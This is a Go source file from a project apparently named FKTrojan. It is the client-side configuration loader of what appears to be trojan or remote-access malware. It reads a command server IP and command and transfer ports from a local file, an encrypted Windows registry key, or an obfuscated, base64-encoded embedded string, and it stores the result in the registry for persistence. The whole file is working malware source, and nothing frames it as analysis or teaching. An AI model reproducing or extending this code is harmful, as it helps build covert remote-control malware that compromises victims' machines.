package config_client

import (
	"FKTrojan/common"
	"FKTrojan/registry_crypto"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
)

type Config struct {
	ServerIp  string `json:"server_ip"`
	CmdPort   int    `json:"cmd_port"`
	TransPort int    `json:"trans_port"`
}

var (
	Conf Config
)

func readRegistry() (Config, error) {
	k, err := registry_crypto.Get(registry_crypto.CONFIGKEY)
	if err != nil {
		return Config{}, err
	}
	fmt.Printf("config is : %s\n", k)
	var config Config
	err = json.Unmarshal([]byte(k), &config)
	if err != nil {
		return Config{}, err
	}
	return config, nil
}
func writeRegistry(config *Config) error {
	configByte, err := json.MarshalIndent(*config, "", " ")
	if err != nil {
		return err
	}
	return registry_crypto.Set(registry_crypto.CONFIGKEY, string(configByte))
}

// 在有config.json的情况下使用配置，否则使用默认值
func loadConfig(configPath string) error {
	//fmt.Printf("use %s \n", configPath)
	if !common.PathExist(configPath) {
		//fmt.Printf("do not use %s \n", configPath)
		return fmt.Errorf("config not exist %s", configPath)
	}
	recordByte, err := ioutil.ReadFile(configPath)
	if err != nil {
		return err
	}
	err = json.Unmarshal(recordByte, &Conf)
	if err != nil {
		return err
	}
	//fmt.Printf("use %s %+v\n", configPath, config)
	return nil
}
func loadFromString() error {
	err := json.Unmarshal([]byte(common.Base64Decode(common.Deobfuscate(configRemote))), &Conf)
	if err != nil {
		return err
	}

	//fmt.Printf("use %s %+v\n", configPath, config)
	return nil
}

func Load() {
	currentPath := common.CurrentBinaryDir()
	configPath := filepath.Join(currentPath, "config_client.json")
	testFlag := false
	if testFlag {
		copy := func(src, dst string) error {
			in, err := os.Open(src)
			if err != nil {
				return err
			}
			defer in.Close()

			out, err := os.Create(dst)
			if err != nil {
				return err
			}
			defer out.Close()

			_, err = io.Copy(out, in)
			if err != nil {
				return err
			}
			return out.Close()
		}
		copy("D:/bin/config_client.json", configPath)
	}
	err := loadConfig(configPath)
	if err == nil {
		err = writeRegistry(&Conf)
		if err != nil {
			fmt.Printf("write config error %v\n", err)
		}
		return
	}

	Conf, err = readRegistry()
	if err == nil {
		return
	}

	err = loadFromString()
	if err == nil {
		err = writeRegistry(&Conf)
		if err != nil {
			fmt.Printf("write config error %v\n", err)
		}
		return
	}

	/*
		if err != nil {
			//Flog.Flog.Printf("load config_client.json error %v", err)
			Conf, err = readRegistry()
			if err != nil {

				fmt.Println("can not find config")
				os.Exit(1)
			}
			//Flog.Flog.Printf("config is %+v", Conf)
		} else {
			err = writeRegistry(&Conf)
			if err != nil {
				fmt.Printf("write config error %v\n", err)
			}
		}*/
}
